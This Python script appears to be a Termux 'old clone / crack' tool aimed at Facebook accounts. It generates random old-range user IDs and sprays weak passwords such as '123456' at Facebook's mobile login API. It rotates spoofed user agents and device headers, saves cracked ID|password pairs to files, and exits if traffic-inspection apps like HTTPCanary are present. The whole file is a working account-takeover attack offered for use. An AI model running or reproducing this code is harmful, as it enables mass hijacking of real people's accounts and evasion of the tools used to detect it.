#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import time
import uuid
import random
import string
import requests
import sys
import json
import subprocess
import shutil
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from requests.exceptions import ConnectionError, JSONDecodeError
from requests import api, models, sessions

# --------------------------
# Initial Setup & Install Dependencies
# --------------------------
os.system('pip uninstall requests chardet urllib3 idna certifi -y > /dev/null 2>&1')
os.system('pip install chardet urllib3 idna certifi requests beautifulsoup4 httpx rich --upgrade > /dev/null 2>&1')
requests.urllib3.disable_warnings()

# --------------------------
# Color Codes
# --------------------------
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
GREEN = "\033[1;32m"
RESET = "\033[0m"
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
K = '\033[95m'
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'

# --------------------------
# Anti-Tampering (Fixed / Safe Version)
# --------------------------
try:
    api_body = open(api.__file__, 'r', encoding='utf-8').read()
    models_body = open(models.__file__, 'r', encoding='utf-8').read()
    session_body = open(sessions.__file__, 'r', encoding='utf-8').read()
    word_list = ['zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            sys.exit()
except Exception:
    pass

class sec:
    def __init__(self):
        self.paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in self.paths:
            if os.path.exists(path):
                try:
                    content = open(path, 'r', encoding='utf-8').read()
                    if 'print' in content:
                        self.fuck()
                except Exception:
                    pass
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png') or \
           os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(f'{GREEN}Tampering detected! Exiting...{RESET}')
        sys.exit()

sec()

# --------------------------
# Lock & Key System (Fixed Syntax)
# --------------------------
channel_link = "https://t.me/hqhteam"
approved_keys = ["DomIT"]
MAX_ATTEMPTS = 3
COOLDOWN_SECONDS = 8

def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")

def open_link(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.run(["termux-open-url", url], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif shutil.which("xdg-open"):
            subprocess.run(["xdg-open", url], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def normalize(s):
    return " ".join(str(s).split()).lower().strip() if s else ""

approved_normalized = {normalize(k) for k in approved_keys}

def first_step():
    clear_screen()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"        {GREEN}🔒 Script Locked 🔒{RESET}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print(f"{GREEN} THIS TOOL IS PAID ✅ {RESET}\n")
    print("Please open the admin/channel first and get your key.\n")
    print(f"Channel: {channel_link}\n")
    if channel_link.startswith("http"):
        open_link(channel_link)
    input("\nPress Enter when ready...")

def check_key():
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        user_key = input("\nEnter your key: ").strip()
        if normalize(user_key) in approved_normalized:
            print(f"\n{GREEN}✅ Key Approved! Running tool...{RESET}\n")
            return True
        attempts += 1
        print(f"{rad}❌ Invalid key! Attempts left: {MAX_ATTEMPTS - attempts}{RESET}")
    print(f"\n{rad}Too many wrong attempts. Wait {COOLDOWN_SECONDS}s...{RESET}")
    time.sleep(COOLDOWN_SECONDS)
    sys.exit(1)

# --------------------------
# Banner & Utilities
# --------------------------
def ____banner____():
    clear_screen()
    print(f"""{GREEN}
▒██████▄░░▒██████▄░▒███▄░░▒███╗░███████╗██████╗ 
▒██╔══▒██╗██╔═══▒██╗████╗░████║░██╔════╝██╔══██╗
▒██║░░▒██║██║░░░▒██║██╔████╔██║░█████╗░▒██████╔╝
▒██║░░▒██║██║░░░▒██║██║╚██╔╝██║░██╔══╝░▒██╔══██╗
▒██████░╔╝╚██████╔╝░██║░╚═╝░██║░██║░░░░▒██████╔╝
▒╚═════╝▒▒▒╚═════╝░░╚═╝░░░░░╚═╝░╚═╝░░░░▒╚═════╝

{RESET}""")

def linex():
    print(f"{GS}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

def creationyear(uid):
    uid = str(uid).strip()
    l = len(uid)
    if l == 15:
        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
    elif l in (9, 10):
        return '2008'
    elif l == 8:
        return '2007'
    elif l == 7:
        return '2006'
    elif l == 14 and uid.startswith('61'):
        return '2024'
    return 'Unknown'

# --------------------------
# User-Agent Generators
# --------------------------
def windows():
    aV = str(rr(10, 20))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {rr(5,7)}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{rr(8,12)}.0.{rr(552,661)}.0 Safari/534.{aV}"
    bz = f'5{rr(34,38)}.{rr(1,36)}'
    B = f"Mozilla/5.0 (Windows NT {rr(5,7)}.{rr(1,2)}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{rr(12,42)}.0.{rr(742,2200)}.{rr(1,120)} Safari/{bz}"
    C = f"Mozilla/5.0 (Windows NT 6.{rr(1,2)}; WOW64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{rr(12,42)}.0.{rr(742,2200)}.{rr(1,120)} Safari/{bz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.{rr(1000,9999)}.0 Safari/537.36"
    return random.choice([A,B,C,D])

def window1():
    aV = str(rr(10, 20))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {rr(6,11)}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{rr(80,122)}.0.{rr(4000,7000)}.0 Safari/534.{aV}"
    bz = f'5{rr(34,38)}.{rr(1,36)}'
    B = f"Mozilla/5.0 (Windows NT {rr(6,11)}.{rr(0,1)}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{rr(80,122)}.0.{rr(4000,7000)}.{rr(50,200)} Safari/{bz}"
    C = f"Mozilla/5.0 (Windows NT 6.{rr(0,2)}; WOW64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{rr(80,122)}.0.{rr(4000,7000)}.{rr(50,200)} Safari/{bz}"
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0','11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{rr(6000,9000)}.{rr(100,200)} Safari/537.36"
    return random.choice([A,B,C,D])

# --------------------------
# Global Variables
# --------------------------
method = []
oks = []
cps = []
loop = 0
user = []

# --------------------------
# Facebook Login Methods (Fixed Error Handling)
# --------------------------
def login_1(uid):
    global loop
    session = requests.Session()
    session.verify = False
    try:
        sys.stdout.write(f"\r{rad}+{W}(AHB-M1){rad}({W}{loop}{rad}){W} OK:{G}{len(oks)}{W}")
        sys.stdout.flush()
        passwords = ('123456', '1234567', '12345678', '123456789', '123123')
        for pw in passwords:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(rr(20000, 40000)),
                'X-FB-SIM-HNI': str(rr(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': f'nid={uuid.uuid4().hex[:8]};pid=Main;tid={rr(100,999)};',
                'x-fb-device-group': str(rr(1000, 9999)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': uuid.uuid4().hex
            }
            try:
                res = session.post(
                    'https://b-graph.facebook.com/auth/login',
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    timeout=12
                )
                res.raise_for_status()
                res_json = res.json()
            except (JSONDecodeError, ConnectionError, requests.exceptions.RequestException):
                time.sleep(1)
                continue

            if 'session_key' in res_json:
                print(f"\n{G}✅ AHB-OK {uid} | {pw} | {creationyear(uid)}{RESET}")
                with open('/sdcard/AHB-OLD-M1-OK.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(res_json.get('error', {})):
                print(f"\n{PP}⚠️ AHB-CP {uid} | {pw} | {creationyear(uid)}{RESET}")
                with open('/sdcard/AHB-OLD-M1-CP.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(2)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r{rad}+{W}(AHB-M2){rad}({W}{loop}{rad}){W} OK:{G}{len(oks)}{W}")
    sys.stdout.flush()
    passwords = ('123456', '123123', '1234567', '12345678', '123456789')
    for pw in passwords:
        try:
            with requests.Session() as session:
                session.verify = False
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = (
                    f"https://b-api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={pw}&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                    f"&source=device_based_login&meta_inf_fbmeta=&currently_logged_in_userid=0"
                    f"&method=GET&locale=en_US&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                res = session.get(url, headers=headers, timeout=12)
                res.raise_for_status()
                res_json = res.json()
                if 'session_key' in str(res_json):
                    print(f"\n{G}✅ AHB-OK {uid} | {pw} | {creationyear(uid)}{RESET}")
                    with open('/sdcard/AHB-OLD-M2-OK.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except (JSONDecodeError, ConnectionError, requests.exceptions.RequestException):
            time.sleep(1)
            continue
    loop += 1

# --------------------------
# Main Menu & Functions
# --------------------------
def BNG_71_():
    ____banner____()
    print(f'       {rad}(A){W} {GREEN}OLD CLONE / CRACK{RESET}')
    linex()
    __Jihad__ = input(f"       {rad}➤ {W}CHOICE: {Y}").strip().upper()
    if __Jihad__ in ('A', '1', '01'):
        old_clone()
    else:
        print(f"\n{rad}❌ Invalid option!{RESET}")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print(f'       {rad}(A){W} {GREEN}ALL SERIES{RESET}')
    print(f'       {rad}(B){W} {GREEN}100003 / 100004 SERIES{RESET}')
    print(f'       {rad}(C){W} {GREEN}2009 SERIES{RESET}')
    linex()
    _input = input(f"       {rad}➤ {W}CHOICE: {Y}").strip().upper()
    if _input in ('A', '1', '01'):
        old_One()
    elif _input in ('B', '2', '02'):
        old_Tow()
    elif _input in ('C', '3', '03'):
        old_Tree()
    else:
        print(f"\n{rad}❌ Invalid option!{RESET}")
        time.sleep(1.5)
        old_clone()

def old_One():
    user = []
    ____banner____()
    print(f"       {GREEN}OLD SERIES: 2010 - 2014{RESET}")
    limit_input = input(f"       {rad}➤ {W}HOW MANY IDS TO GENERATE: {Y}").strip()
    try:
        limit = int(limit_input)
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f"{rad}❌ Enter a valid positive number!{RESET}")
        time.sleep(1.5)
        return old_One()
    star = '10000'
    for _ in range(limit):
        suffix = str(rr(1000000000, 4999999999))
        user.append(star + suffix)
    print(f'       {rad}(A){W} {GREEN}METHOD 1{RESET}')
    print(f'       {rad}(B){W} {GREEN}METHOD 2{RESET}')
    linex()
    meth = input(f"       {rad}➤ {W}CHOOSE METHOD: {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{rad}❌ Invalid method!{RESET}")
        time.sleep(1.5)
        return old_One()
    ____banner____()
    print(f"       {GREEN}TOTAL IDS: {limit}{RESET}")
    print(f"       {PP}💡 Use Airplane Mode every 5 mins for better results{RESET}")
    linex()
    with tred(max_workers=15) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    ____banner____()
    print(f"       {GREEN}SERIES: 100003 / 100004{RESET}")
    limit_input = input(f"       {rad}➤ {W}HOW MANY IDS: {Y}").strip()
    try:
        limit = int(limit_input)
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f"{rad}❌ Enter a valid positive number!{RESET}")
        time.sleep(1.5)
        return old_Tow()
    prefixes = ['100003', '100004']
    for _ in range(limit):
        uid = random.choice(prefixes) + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    print(f'       {rad}(A){W} {GREEN}METHOD 1{RESET}')
    print(f'       {rad}(B){W} {GREEN}METHOD 2{RESET}')
    linex()
    meth = input(f"       {rad}➤ {W}CHOOSE METHOD: {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{rad}❌ Invalid method!{RESET}")
        time.sleep(1.5)
        return old_Tow()
    ____banner____()
    print(f"       {GREEN}TOTAL IDS: {limit}{RESET}")
    print(f"       {PP}💡 Use Airplane Mode every 5 mins for better results{RESET}")
    linex()
    with tred(max_workers=15) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    ____banner____()
    print(f"       {GREEN}SERIES: 2009 / 1000004{RESET}")
    limit_input = input(f"       {rad}➤ {W}HOW MANY IDS: {Y}").strip()
    try:
        limit = int(limit_input)
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f"{rad}❌ Enter a valid positive number!{RESET}")
        time.sleep(1.5)
        return old_Tree()
    prefix = '1000004'
    for _ in range(limit):
        uid = prefix + ''.join(random.choices('0123456789', k=8))
        user.append(uid)
    print(f'       {rad}(A){W} {GREEN}METHOD 1{RESET}')
    print(f'       {rad}(B){W} {GREEN}METHOD 2{RESET}')
    linex()
    meth = input(f"       {rad}➤ {W}CHOOSE METHOD: {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{rad}❌ Invalid method!{RESET}")
        time.sleep(1.5)
        return old_Tree()
    ____banner____()
    print(f"       {GREEN}TOTAL IDS: {limit}{RESET}")
    print(f"       {PP}💡 Use Airplane Mode every 5 mins for better results{RESET}")
    linex()
    with tred(max_workers=15) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

# --------------------------
# Run Tool
# --------------------------
if __name__ == "__main__":
    # Grant storage permission first in Termux
    if os.path.exists('/data/data/com.termux'):
        try:
            subprocess.run(['termux-setup-storage'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    first_step()
    check_key()
    BNG_71_()